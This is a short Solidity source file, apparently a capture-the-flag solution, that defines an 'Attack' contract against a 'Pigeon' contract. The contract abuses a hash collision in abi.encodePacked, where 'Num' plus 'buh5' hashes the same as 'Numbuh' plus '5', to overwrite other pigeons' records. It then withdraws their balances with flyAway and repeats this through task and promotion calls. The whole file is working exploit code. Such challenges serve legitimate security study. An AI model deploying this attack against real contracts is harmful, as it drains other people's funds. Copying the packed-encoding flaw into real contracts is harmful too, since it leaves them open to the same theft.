// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./Pigeon.sol";

contract Attack {
    Pigeon target;

    constructor(address _target)
    {
        target = Pigeon(_target);
    }

    function attack() public
    {
        bytes32 codename1 = keccak256(abi.encodePacked("Numbuh", "5"));
        bytes32 codename2 = keccak256(abi.encodePacked("Numbuh", "3"));
        bytes32 codename3 = keccak256(abi.encodePacked("Numbuh", "1"));

        //get the money of the first pigeon by overwritting the juniorPigeon[Codename]
        target.becomeAPigeon("Num", "buh5");
        target.flyAway(codename1, 0);

        //upgrade
        target.task(codename1, address(42069), address(this).balance);
        target.promotion(codename1, 1, "Num", "buh3");
        target.flyAway(codename2, 1);

        target.task(codename2, address(42069), address(this).balance);
        target.promotion(codename2, 2, "Num", "buh1");
        target.flyAway(codename3, 2);
    }

    receive() payable external
    {

    }
}


